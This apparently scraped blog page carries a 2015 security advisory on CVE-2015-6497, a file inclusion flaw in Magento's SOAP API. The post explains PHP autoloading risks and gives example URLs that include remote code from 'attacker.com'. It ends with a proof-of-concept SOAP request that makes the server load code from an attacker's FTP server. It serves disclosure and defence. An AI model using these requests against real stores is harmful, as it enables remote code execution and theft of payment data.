* [Vulnerabilities statistics](https://blog.mindedsecurity.com/search/label/Vulnerabilities%20statistics)
  (
  1
  )
* [WAF](https://blog.mindedsecurity.com/search/label/WAF)
  (
  1
  )
* [WAPT](https://blog.mindedsecurity.com/search/label/WAPT)
  (
  1
  )
* [Web Application Firewall](https://blog.mindedsecurity.com/search/label/Web%20Application%20Firewall)
  (
  1
  )
* [web architecture security](https://blog.mindedsecurity.com/search/label/web%20architecture%20security)
  (
  1
  )
* [Web Attacks](https://blog.mindedsecurity.com/search/label/Web%20Attacks)
  (
  23
  )
* [web cache](https://blog.mindedsecurity.com/search/label/web%20cache)
  (
  1
  )
* [web injection](https://blog.mindedsecurity.com/search/label/web%20injection)
  (
  4
  )
* [Web Security](https://blog.mindedsecurity.com/search/label/Web%20Security)
  (
  23
  )
* [Windows Phone Security](https://blog.mindedsecurity.com/search/label/Windows%20Phone%20Security)
  (
  1
  )
* [WWeb Security](https://blog.mindedsecurity.com/search/label/WWeb%20Security)
  (
  2
  )
* [zeus p2p](https://blog.mindedsecurity.com/search/label/zeus%20p2p)
  (
  3
  )

## Blog Archive

* [May](https://blog.mindedsecurity.com/2024/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2024/04/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2024/03/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2023/10/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2023/06/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2023/03/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2023/02/)
  (
  1
  )
* [July](https://blog.mindedsecurity.com/2022/07/)
  (
  1
  )
* [December](https://blog.mindedsecurity.com/2021/12/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2021/08/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2021/05/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2021/02/)
  (
  1
  )
* [January](https://blog.mindedsecurity.com/2021/01/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2020/11/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2020/10/)
  (
  1
  )
* [July](https://blog.mindedsecurity.com/2020/07/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2020/06/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2020/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2020/04/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2020/03/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2020/02/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2019/04/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2018/10/)
  (
  3
  )
* [September](https://blog.mindedsecurity.com/2018/09/)
  (
  3
  )
* [July](https://blog.mindedsecurity.com/2018/07/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2018/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2018/04/)
  (
  2
  )
* [November](https://blog.mindedsecurity.com/2017/11/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2017/06/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2016/02/)
  (
  2
  )
* [January](https://blog.mindedsecurity.com/2016/01/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2015/11/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2015/10/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2015/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2015/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2015/06/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2015/04/)
  (
  2
  )
* [March](https://blog.mindedsecurity.com/2015/03/)
  (
  4
  )
* [February](https://blog.mindedsecurity.com/2015/02/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2014/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2014/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2014/06/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2013/10/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2013/04/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2013/02/)
  (
  2
  )
* [November](https://blog.mindedsecurity.com/2012/11/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2012/10/)
  (
  3
  )
* [September](https://blog.mindedsecurity.com/2012/09/)
  (
  4
  )
* [June](https://blog.mindedsecurity.com/2012/06/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2011/10/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2011/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2011/08/)
  (
  2
  )
* [July](https://blog.mindedsecurity.com/2011/07/)
  (
  2
  )
* [May](https://blog.mindedsecurity.com/2011/05/)
  (
  2
  )
* [April](https://blog.mindedsecurity.com/2011/04/)
  (
  2
  )
* [March](https://blog.mindedsecurity.com/2011/03/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2010/10/)
  (
  8
  )
* [September](https://blog.mindedsecurity.com/2010/09/)
  (
  3
  )
* [August](https://blog.mindedsecurity.com/2010/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2010/06/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2010/04/)
  (
  4
  )
* [March](https://blog.mindedsecurity.com/2010/03/)
  (
  1
  )
* [December](https://blog.mindedsecurity.com/2009/12/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2009/11/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2009/10/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2009/05/)
  (
  4
  )
* [February](https://blog.mindedsecurity.com/2009/02/)
  (
  2
  )
* [January](https://blog.mindedsecurity.com/2009/01/)
  (
  1
  )

####

Minded Security was established in Italy in 2007

with a focus on supporting businesses and

organizations to build secure products
 and services.

##### Services

* Training
* Testing
* Consulting
* Request a brochure

##### Information

* The Company
* blueclosure
* AMT – Banking Malware Detector
* Contact us
* Privacy Policy

##### Newsletter

©2015 Minded Security S.r.l. The Software Security Company - VAT IT05756380480

[Back to top](#top)



=== Content from blog.mindedsecurity.com_76ba89be_20250126_020849.html ===


[Subscribe our newsletter](https://mindedsecurity.com/newsletter)

[Minded Security](https://mindedsecurity.com)

* Industry
  + [Automotive/Maritime](https://mindedsecurity.com/industry/automotive-maritime/ "Automotive/Maritime")
  + [Financial](https://mindedsecurity.com/industry/financial/ "Financial")
  + [GDO](https://mindedsecurity.com/industry/gdo/ "GDO")
  + [Industrial Control Systems](https://mindedsecurity.com/industry/industrial-control-systems/ "Industrial Control Systems")
  + [IoT Security](https://mindedsecurity.com/industry/iot-security/ "IoT Security")
  + [Healthcare](https://mindedsecurity.com/industry/healthcare/ "Healthcare")
  + [Government](https://mindedsecurity.com/industry/government/ "Government")
* [Services](https://mindedsecurity.com/our-services/ "Services")
  + [Training](https://mindedsecurity.com/our-services/training/ "Training")
    - [Security Hackaton](https://mindedsecurity.com/services/training/security-hackaton/ "Security Hackaton")
    - [Advanced On-site Training](https://mindedsecurity.com/services/training/advanced-on-site-training/ "Advanced On-site Training")
    - [BlueClosure Training](https://mindedsecurity.com/services/training/blueclosure-training/ "BlueClosure Training")
    - [High Level Training](https://mindedsecurity.com/services/training/high-level-training/ "High Level Training")
    - [Webinar](https://mindedsecurity.com/services/training/webinar/ "Webinar")
  + [Testing](https://mindedsecurity.com/our-services/testing/ "Testing")
    - [Manual Secure Code Review](https://mindedsecurity.com/services/testing/manual-secure-code-review/ "Manual Secure Code Review")
    - [Manual WAPT](https://mindedsecurity.com/services/testing/manual-wapt/ "Manual WAPT")
    - [Cloud Security Testing](https://mindedsecurity.com/services/testing/cloud-security-testing/ "Cloud Security Testing")
    - [IoT Security](https://mindedsecurity.com/services/testing/iot-security/ "IoT Security")
    - [API Security](https://mindedsecurity.com/services/testing/api-security/ "API Security")
    - [Mobile Security Assessment](https://mindedsecurity.com/services/testing/mobile-security-assessment/ "Mobile Security Assessment")
    - [Client Side Assessment](https://mindedsecurity.com/services/testing/client-side-assessment/ "Client Side Assessment")
  + [Consulting](https://mindedsecurity.com/our-services/consulting/ "Consulting")
    - [Software Security Advisory](https://mindedsecurity.com/services/consulting/software-security-advisory/ "Software Security Advisory")
    - [5D Framework](https://mindedsecurity.com/services/consulting/5d-framework/ "5D Framework")
    - [Threat Modeling](https://mindedsecurity.com/services/consulting/threat-modeling/ "Threat Modeling")
    - [Secure Design](https://mindedsecurity.com/services/consulting/secure-design/ "Secure Design")
    - [Secure Architecture Review](https://mindedsecurity.com/services/consulting/secure-architecture-review/ "Secure Architecture Review")
    - [Secure Coding Guidelines](https://mindedsecurity.com/services/consulting/secure-coding-guidelines/ "Secure Coding Guidelines")
    - [Fixing Support](https://mindedsecurity.com/services/consulting/fixing-support/ "Fixing Support")
    - [Outsourcing Development Governance](https://mindedsecurity.com/services/consulting/outsourcing-development-governance/ "Outsourcing Development Governance")
  + [Request a brochure](https://mindedsecurity.com/request-a-brochure/ "Request a brochure")
* Resources
  + [Blog](https://blog.mindedsecurity.com/ "Blog")
  + [News](https://mindedsecurity.com/category/news/ "News")
  + [Videos](https://mindedsecurity.com/videos/ "Videos")
  + [Research](https://mindedsecurity.com/research/ "Research")
  + [Advisories](https://mindedsecurity.com/research/advisories/ "Advisories")
* [About us](https://mindedsecurity.com/our-mission/ "About us")
  + [The Company](https://mindedsecurity.com/the-company/ "The Company")
  + [Contact us](https://mindedsecurity.com/contact-us/ "Contact us")
  + [Newsletter](https://mindedsecurity.com/newsletter/ "Newsletter")
  + [Jobs](https://mindedsecurity.com/jobs/ "Jobs")
  + [Privacy Policy](https://mindedsecurity.com/privacy-policy/ "Privacy Policy")

## IMQ Minded Security Blog

[skip to main](#main)  |
[skip to sidebar](#sidebar)

Showing posts with label **Magento**. [Show all posts](https://blog.mindedsecurity.com/)

Showing posts with label **Magento**. [Show all posts](https://blog.mindedsecurity.com/)

## Friday, September 11, 2015

# [Autoloaded File Inclusion in Magento SOAP API (SUPEE-6482)](https://blog.mindedsecurity.com/2015/09/autoloaded-file-inclusion-in-magento.html)

This past February we reported an interesting and quite overlooked kind of vulnerability in the [Magento](http://magento.com/) web e-commerce platform. The vulnerability might allow an authenticated attacker to execute arbitrary code on the affected web stores, and this can lead to a complete compromise, including credit card information and personal data theft. We received the first reply from the Magento Security Team on June 22, 2015, stating that our submission was not eligible for the bug bounty program, because it was found to be invalid and not actionable. The reason for the rejection was that there are too many requirements to exploit the vulnerability, first of all it requires that Magento is running on outdated PHP versions, because this kind of vulnerability has been fixed in the PHP core engine at the beginning of 2014. However, as we will see in this post, there are still many websites out there using such outdated PHP versions. That should be one of the reasons why the Magento Security Team replied us on June 25, 2015, stating the following:
> *We were able to confirm your issue. Even though it requires knowing API credentials, it should not be possible to execute such actions. The PHP versions that are additionally vulnerable, while old are still used in popular distributions like RHEL 7.1.* *We will schedule fixing this issue for our next product release given lower priority. We will inform you regarding possible awards associated with this report.*

On August 4, 2015, a bundle of patches ([SUPEE-6482](http://magento.com/security/patches/supee-6482)) has been released by the Magento team, that resolved several security-related issues, including the one we reported in February. The same day Magento released new versions (Community Edition 1.9.2.1 and Enterprise Edition 1.14.2.1) that include SUPEE-6482 along with other security patches. On August 13, 2015, we requested a new CVE identifier for this vulnerability, and MITRE has assigned the name [CVE-2015-6497](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2015-6497) for it.

### **What is an "Autoloaded File Inclusion" vulnerability?**

This kind of vulnerability might affect PHP applications which uses an "exploitable" autoloading mechanism. The "[Autoloading Classes](http://php.net/manual/en/language.oop5.autoload.php)" feature has been introduced in PHP 5.0 with the magic function *\_\_autoload()* which is automatically called when your code references a class or interface that hasn’t been loaded yet. So, instead of including every needed class by hand, is it possible to register a function that gets called as soon as the code try to instantiate an unknown class. This function gets passed the unknown class name and is responsible for including the right file that contains the class definition. As an aside, starting from PHP 5.1.2 autoload-functions are usually registered via [*spl\_autoload\_register()*](http://php.net/manual/en/function.spl-autoload-register.php), which provides a more flexible alternative for autoloading classes. For this reason, using *\_\_autoload()* is discouraged and may be deprecated in the future. Here’s an example of an extremely basic *\_\_autoload()* implementation, which attempts to load the classes MyClass1 and MyClass2 from the files MyClass1.php and MyClass2.php respectively (it's taken from the official PHP documentation page):

```
<?php

 function __autoload($class_name) {
    include $class_name . '.php';
 }

 $obj  = new MyClass1();
 $obj2 = new MyClass2();

?>
```

While this feature is extremely useful and powerful, it might introduce potential local/remote file inclusion vulnerabilities when user-controlled input is used as a class name. Indeed, if an attacker can control the class name variable passed to an autoloading function, she could try to play around with it in order to include an arbitrary file and execute PHP code remotely. There are multiple ways to trigger the autoloader, the most obvious is class instantiation using the ***new*** operator. In addition to that, there are some PHP functions which can be considered as *sensitive sinks* for this kind of vulnerability. Here is an incomplete list:

* [class\_exists()](http://php.net/manual/en/function.class-exists.php)
* [interface\_exists()](http://php.net/manual/en/function.interface-exists.php)
* [method\_exists()](http://php.net/manual/en/function.method-exists.php)
* [property\_exists()](http://php.net/manual/en/function.property-exists.php)
* [is\_subclass\_of()](http://php.net/manual/en/function.is-subclass-of.php)
* ...

So, when user-controlled input (*tainted data*) enters one of these *sensitive sinks* there's a chance for the application to be vulnerable to "Autoloaded File Inclusion". Let's see a trivial example of vulnerable scripts:

```
<?php

 /* File: autoload.php */

 function __autoload($class_name) {
    include $class_name . '.php';
 }

?>
```

```
<?php

 /* File: vuln.php */

 require('autoload.php');

 if(isset($_GET['class']) && class_exists($_GET['class'])) {
    $obj = new $_GET['class'];
 } else {
    die('No class found');
 }

 /* Some code... */

?>
```

In this example an attacker controls a class name via the GET parameter "class", which is first used with the *class\_exists()* function (triggering the autoloader in case it is an unknown class) and then to instantiate a new object. This means that the attacker can control the *$class\_name* variable passed to the autoloader, therefore it could be possible to include arbitrary files from both local or remote resources by invoking URLs like these:

> **http://example.com/vuln.php?class=http://attacker.com/shell**
>
> **http://example.com/vuln.php?class=../../../tmp/cache/attacker\_controlled/file**

In the first case the autoloader will try to include and execute the PHP code located at *http://attacker.com/shell.php*, resulting in a Remote File Inclusion (RFI); while in the second case the autoloader will try to include and execute the PHP code located into the file */tmp/cache/attacker\_controlled/file.php*, resulting in a Local File Inclusion (LFI). Furthermore, in cases like this where the attacker controls the classname's prefix, in addition to http:// other [PHP wrappers](http://php.net/manual/en/wrappers.php) might be abused in order to execute arbitrary PHP code.

But... wait a moment! According to the [official documentation](http://php.net/manual/en/language.oop5.basic.php) *"a valid class name starts with a letter or underscore, followed by any number of letters, numbers, or underscores".* That means an attacker cannot include arbitrary files via class names because it should not be possible to e.g. use path traversal sequences (../../) through them. But here comes the problem: there was a [bug](https://bugs.php.net/bug.php?id=62789) in the PHP core which allowed to invoke class autoloaders with invalid class names. This bug has been solved in [January 2014](http://www.php.net/ChangeLog-5.php#5.4.24) with the release of PHP versions 5.4.24 and 5.5.8.

### **How many vulnerable PHP installs are out there?**

Well, the bug which might enable this kind of vulnerability has been fixed by the PHP team at the beginning of 2014. But is this enough to say this kind of vulnerability should not pose any security concern? Maybe not... At the end of 2014 has been published a [blog post](http://blog.ircmaxell.com/2014/12/php-install-statistics.html) showing that 78% of all PHP installs were not secure, meaning they had at least one known security vulnerability. Antony Ferrara, the author of that post, used the statistics data from [W3Techs](http://w3techs.com/) in order to come to that conclusion. Let's try to do the same with regards to the PHP installs affected by the autoloading bug. In other words, let's check how many PHP websites are using PHP versions before 5.4.24 or 5.5.8.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3EM7BJaEsfNVf5ER6me7RRHTJv_OcYNGxTPNSy9eSz_sK4Q2k0BVlc5IHcUnCTR7s5uDsUtPLERaajRpFqJenNa_HItbVojHmAEMQH9Qk-4-Bfq7oyk3D3_0sM2LnGpQP3i-TxQBeteY/s400/php5.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3EM7BJaEsfNVf5ER6me7RRHTJv_OcYNGxTPNSy9eSz_sK4Q2k0BVlc5IHcUnCTR7s5uDsUtPLERaajRpFqJenNa_HItbVojHmAEMQH9Qk-4-Bfq7oyk3D3_0sM2LnGpQP3i-TxQBeteY/s1600/php5.png)

The above table has been retrieved from the [PHP version 5](http://w3techs.com/technologies/details/pl-php/5/all) usage statistics page from W3Techs, as of September 10, 2015. It shows that at least **54.2%** of websites using PHP are affected by the autoloading bug (38.5% is using PHP 5.3, 14.7% is using PHP 5.2 and 1% is using PHP 5.1). Next step is to see how many websites are using vulnerable PHP 5.4.x and 5.5.x versions. The usage statistics page for [subversions of PHP 5.4](http://w3techs.com/technologies/details/pl-php/5.4/all) show that **12.7%** of websites using PHP are running a version before 5.4.24, while the usage statistics page for [subversions of PHP 5.5](http://w3techs.com/technologies/details/pl-php/5.5/all) show that **3.5%** of websites using PHP are running a version before 5.5.8. Overall, this means that **70.4%** of websites using PHP are affected by the autoloading bug. Roughly speaking, considering that according to the official website Magento powers more than 240,000 online shops, this could mean that over 150,000 websites powered by Magento might be affected by [CVE-2015-6497](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2015-6497).

###

### **Technical description of the****vulnerability**

The vulnerability is caused by the *Mage\_Catalog\_Model\_Product\_Api\_V2::create()* method, which handles the "[catalogProductCreate](http://devdocs.magento.com/guides/m1x/api/soap/catalog/catalogProduct/catalog_product.create.html)" SOAP API call. The vulnerable code is located into the /app/code/core/Mage/Catalog/Model/Product/Api/V2.php script:

```
    public function create($type, $set, $sku, $productData, $store = null)
    {
        if (!$type || !$set || !$sku) {
            $this->_fault('data_invalid');
        }

        $this->_checkProductTypeExists($type);
        $this->_checkProductAttributeSet($set);

        /** @var $product Mage_Catalog_Model_Product */
        $product = Mage::getModel('catalog/product');
        $product->setStoreId($this->_getStoreId($store))
            ->setAttributeSetId($set)
            ->setTypeId($type)
            ->setSku($sku);

        if (!property_exists($productData, 'stock_data')) {
            //Set default stock_data if not exist in product data
            $_stockData = array('use_config_manage_stock' => 0);
            $product->setStockData($_stockData);
        }

```

This method expects the $productData parameter to be an array (in form of a stdClass object) and uses the *property\_exists()* function with it. However, an attacker can manipulate a SOAP request arbitrarily and send the $productData parameter in form of a string. In this case, if the string passed to the *property\_exists()* function is an unknown class, any registered autloader function will be triggered. When the *property\_exists()* function is called there's only one autoloader function registered, that is the *Varien\_Autoload::autoload()* method:

```
    public function autoload($class)
    {
        if ($this->_collectClasses) {
            $this->_arrLoadedClasses[self::$_scope][] = $class;
        }
        if ($this->_isIncludePathDefined) {
            $classFile =  COMPILER_INCLUDE_PATH . DIRECTORY_SEPARATOR . $class;
        } else {
            $classFile = str_replace(' ', DIRECTORY_SEPARATOR, ucwords(str_replace('_', ' ', $class)));
        }
        $classFile.= '.php';
        //echo $classFile;die();
        return include $classFile;
    }

```

In such a scenario, the $class parameter automatically passed to this method is exactly the same string value sent through the $productData parameter from the SOAP request, which after some replacementes and a ".php" string appended to it, is being used in a call to the *[include()](http://php.net/manual/it/function.include.php)* function. This may result in an arbitrary file inclusion (both from local or remote resources) and could be exploited to include and execute arbitrary PHP code. There are some conditions which should be met in order to exploit this vulnerability:

* an API user account with privileges to create a catalog product is required;
* in order to include arbitrary files from remote locations, Magento should run on PHP before
  5.4.24 or 5.5.8, because such versions have fixed the issue related to invalid class names
  in the autoloading process;
* in order to include arbitrary files from remote locations the "allow\_url\_include" directive
  must be set to On;
* in case the allow\_url\_include directive is set to Off it might still be possible to include
  files from remote locations using the ssh2.sftp:// wrapper (which requires the SSH2 extension
  to be installed) or execute arbitrary OS commands leveraging the expect:// wrapper (which
  requires the Expect extension to be installed).

NOTE: if Magento is running on PHP version after 5.4.23 or 5.5.7 the vulnerability
could still be exploited by including a local file with a .php extension (something like /tmp/test.php).
If Magento is running on PHP before 5.3.4 the vulnerability could be exploited to include arbitrary
local files with any extension (e.g. a session file containing malicious PHP code injected by the
attacker) because NULL bytes are allowed within the path (see [CVE-2006-7243](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2006-7243)).

### **Proof of Concept**

Once logged in with valid API credentials, an attacker could send a SOAP request like the following in order to try to exploit the vulnerability:
> POST /magento/index.php/api/v2\_soap HTTP/1.0
>
> Host: localhost
>
> Content-Length: 804
>
> Connection: close
>
>
>
> <?xml version="1.0" encoding="UTF-8"?>
>
> <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="urn:Magento" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
>
> <SOAP-ENV:Body>
>
> <ns1:catalogProductCreate>
>
> <sessionId xsi:type="xsd:string">VALID\_SESSION</sessionId>
>
> <type xsi:type="xsd:string">simple</type>
>
> <set xsi:type="xsd:string">4</set>
>
> <sku xsi:type="xsd:string">test</sku>
>
> <productData xsi:type="xsd:base64Binary">ZnRwOi8vYXR0YWNrZXI6cGFzc3dvcmRAYXR0YWNrZXJfc2VydmVyLmNvbS9ob21lL2F0dGFja2VyL2V2aWw=</productData>
>
> <storeView xsi:nil="true"/>
>
> </ns1:catalogProductCreate>
>
> </SOAP-ENV:Body>
>
> </SOAP-ENV:Envelope>

The  "productData" parameter has been encoded in base64 within the SOAP request, and the decoded string is the following:

> **ftp://attacker:password@attacker\_server.com/home/attacker/evil**

This means that leveraging the [ftp:// wrapper](http://php.net/manual/en/wrappers.ftp.php), an attacker might be able to force Magento to load and execute malicious code from a FTP server under its control. In this example, the attacker only has to put the malicious code under /home/attacker/evil.php. However, as we said before, other PHP wrappers might be abused, potentially leading to direct arbitrary PHP code execution.

By

[Egidio Romano](https://www.blogger.com/profile/14760841123995860416 "author profile")

at

[12:32 AM](https://blog.mindedsecurity.com/2015/09/autoloaded-file-inclusion-in-magento.html "permanent link")

[3 comments
:](https://blog.mindedsecurity.com/2015/09/autoloaded-file-inclusion-in-magento.html#comment-form)

[![](//img2.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7122745763234660283&postID=8106901234847721037&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=email "Email This")
[BlogThis!](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=blog "BlogThis!")
[Share to X](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=twitter "Share to X")
[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=facebook "Share to Facebook")
[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=pinterest "Share to Pinterest")

Labels:
[Advisory](https://blog.mindedsecurity.com/search/label/Advisory)
,
[Autoloaded File Inclusion](https://blog.mindedsecurity.com/search/label/Autoloaded%20File%20Inclusion)
,
[CVE-2015-6497](https://blog.mindedsecurity.com/search/label/CVE-2015-6497)
,
[Magento](https://blog.mindedsecurity.com/search/label/Magento)
,
[Remote Code Execution](https://blog.mindedsecurity.com/search/label/Remote%20Code%20Execution)

[Older Posts](https://blog.mindedsecurity.com/search/label/Magento?updated-max=2015-09-11T00:32:00-07:00&max-results=20&start=20&by-date=false "Older Posts")

[Home](https://blog.mindedsecurity.com/)

Subscribe to:
[Posts
(
Atom
)](https://blog.mindedsecurity.com/feeds/posts/default)

##

## Labels

* [3rd party javascript](https://blog.mindedsecurity.com/search/label/3rd%20party%20javascript)
  (
  2
  )
* [absolute path check](https://blog.mindedsecurity.com/search/label/absolute%20path%20check)
  (
  1
  )
* [Adobe](https://blog.mindedsecurity.com/search/label/Adobe)
  (
  3
  )
* [Advisory](https://blog.mindedsecurity.com/search/label/Advisory)
  (
  5
  )
* [adware](https://blog.mindedsecurity.com/search/label/adware)
  (
  1
  )
* [AFNetworking](https://blog.mindedsecurity.com/search/label/AFNetworking)
  (
  1
  )
* [agile](https://blog.mindedsecurity.com/search/label/agile)
  (
  1
  )
* [AMT](https://blog.mindedsecurity.com/search/label/AMT)
  (
  1
  )
* [Android](https://blog.mindedsecurity.com/search/label/Android)
  (
  1
  )
* [Android Security](https://blog.mindedsecurity.com/search/label/Android%20Security)
  (
  6
  )
* [Anti-Tampering](https://blog.mindedsecurity.com/search/label/Anti-Tampering)
  (
  2
  )
* [Antitamper](https://blog.mindedsecurity.com/search/label/Antitamper)
  (
  2
  )
* [Applet Security](https://blog.mindedsecurity.com/search/label/Applet%20Security)
  (
  6
  )
* [Application Security](https://blog.mindedsecurity.com/search/label/Application%20Security)
  (
  23
  )
* [appsec](https://blog.mindedsecurity.com/search/label/appsec)
  (
  1
  )
* [Arbitrary Code Execution](https://blog.mindedsecurity.com/search/label/Arbitrary%20Code%20Execution)
  (
  4
  )
* [architecture](https://blog.mindedsecurity.com/search/label/architecture)
  (
  1
  )
* [asp.net](https://blog.mindedsecurity.com/search/label/asp.net)
  (
  2
  )
* [ast](https://blog.mindedsecurity.com/search/label/ast)
  (
  1
  )
* [attacks](https://blog.mindedsecurity.com/search/label/attacks)
  (
  1
  )
* [Authentication](https://blog.mindedsecurity.com/search/label/Authentication)
  (
  1
  )
* [Autoloaded File Inclusion](https://blog.mindedsecurity.com/search/label/Autoloaded%20File%20Inclusion)
  (
  1
  )
* [Automotive](https://blog.mindedsecurity.com/search/label/Automotive)
  (
  1
  )
* [Banking](https://blog.mindedsecurity.com/search/label/Banking)
  (
  4
  )
* [Banking Malware](https://blog.mindedsecurity.com/search/label/Banking%20Malware)
  (
  1
  )
* [blackbox](https://blog.mindedsecurity.com/search/label/blackbox)
  (
  1
  )
* [blueclosure](https://blog.mindedsecurity.com/search/label/blueclosure)
  (
  1
  )
* [burp](https://blog.mindedsecurity.com/search/label/burp)
  (
  1
  )
* [canonicalization](https://blog.mindedsecurity.com/search/label/canonicalization)
  (
  1
  )
* [Certificate Pinning](https://blog.mindedsecurity.com/search/label/Certificate%20Pinning)
  (
  1
  )
* [chat](https://blog.mindedsecurity.com/search/label/chat)
  (
  1
  )
* [Client Side HTTP Parameter Pollution](https://blog.mindedsecurity.com/search/label/Client%20Side%20HTTP%20Parameter%20Pollution)
  (
  1
  )
* [cloud](https://blog.mindedsecurity.com/search/label/cloud)
  (
  1
  )
* [cloud browsing](https://blog.mindedsecurity.com/search/label/cloud%20browsing)
  (
  1
  )
* [Code Protection](https://blog.mindedsecurity.com/search/label/Code%20Protection)
  (
  2
  )
* [compliance](https://blog.mindedsecurity.com/search/label/compliance)
  (
  1
  )
* [Concrete5](https://blog.mindedsecurity.com/search/label/Concrete5)
  (
  1
  )
* [Content Security Policy](https://blog.mindedsecurity.com/search/label/Content%20Security%20Policy)
  (
  1
  )
* [CORS](https://blog.mindedsecurity.com/search/label/CORS)
  (
  1
  )
* [Cross Site Scripting](https://blog.mindedsecurity.com/search/label/Cross%20Site%20Scripting)
  (
  7
  )
* [CVE-2015-6497](https://blog.mindedsecurity.com/search/label/CVE-2015-6497)
  (
  1
  )
* [CVE-2021-44228](https://blog.mindedsecurity.com/search/label/CVE-2021-44228)
  (
  1
  )
* [DAB](https://blog.mindedsecurity.com/search/label/DAB)
  (
  1
  )
* [defense](https://blog.mindedsecurity.com/search/label/defense)
  (
  1
  )
* [deobfuscation](https://blog.mindedsecurity.com/search/label/deobfuscation)
  (
  2
  )
* [DeviceSecurity](https://blog.mindedsecurity.com/search/label/DeviceSecurity)
  (
  2
  )
* [DEVSECOPS](https://blog.mindedsecurity.com/search/label/DEVSECOPS)
  (
  1
  )
* [dll](https://blog.mindedsecurity.com/search/label/dll)
  (
  1
  )
* [DNS Rebinding](https://blog.mindedsecurity.com/search/label/DNS%20Rebinding)
  (
  2
  )
* [DOM Based XSS](https://blog.mindedsecurity.com/search/label/DOM%20Based%20XSS)
  (
  9
  )
* [Dom Xss](https://blog.mindedsecurity.com/search/label/Dom%20Xss)
  (
  15
  )
* [DOMinator](https://blog.mindedsecurity.com/search/label/DOMinator)
  (
  11
  )
* [DOMinatorPro](https://blog.mindedsecurity.com/search/label/DOMinatorPro)
  (
  9
  )
* [download](https://blog.mindedsecurity.com/search/label/download)
  (
  1
  )
* [Dyre](https://blog.mindedsecurity.com/search/label/Dyre)
  (
  1
  )
* [Encryption](https://blog.mindedsecurity.com/search/label/Encryption)
  (
  3
  )
* [Expression Language Injection](https://blog.mindedsecurity.com/search/label/Expression%20Language%20Injection)
  (
  3
  )
* [fixing](https://blog.mindedsecurity.com/search/label/fixing)
  (
  1
  )
* [Flex](https://blog.mindedsecurity.com/search/label/Flex)
  (
  2
  )
* [Flutter](https://blog.mindedsecurity.com/search/label/Flutter)
  (
  1
  )
* [gameover](https://blog.mindedsecurity.com/search/label/gameover)
  (
  1
  )
* [Google Plus One](https://blog.mindedsecurity.com/search/label/Google%20Plus%20One)
  (
  1
  )
* [google security](https://blog.mindedsecurity.com/search/label/google%20security)
  (
  1
  )
* [Http Parameter Pollution](https://blog.mindedsecurity.com/search/label/Http%20Parameter%20Pollution)
  (
  2
  )
* [Http Request Splitting](https://blog.mindedsecurity.com/search/label/Http%20Request%20Splitting)
  (
  1
  )
* [Information Disclosure](https://blog.mindedsecurity.com/search/label/Information%20Disclosure)
  (
  2
  )
* [innovation](https://blog.mindedsecurity.com/search/label/innovation)
  (
  2
  )
* [intruder](https://blog.mindedsecurity.com/search/label/intruder)
  (
  1
  )
* [iOS](https://blog.mindedsecurity.com/search/label/iOS)
  (
  2
  )
* [iOS Security](https://blog.mindedsecurity.com/search/label/iOS%20Security)
  (
  7
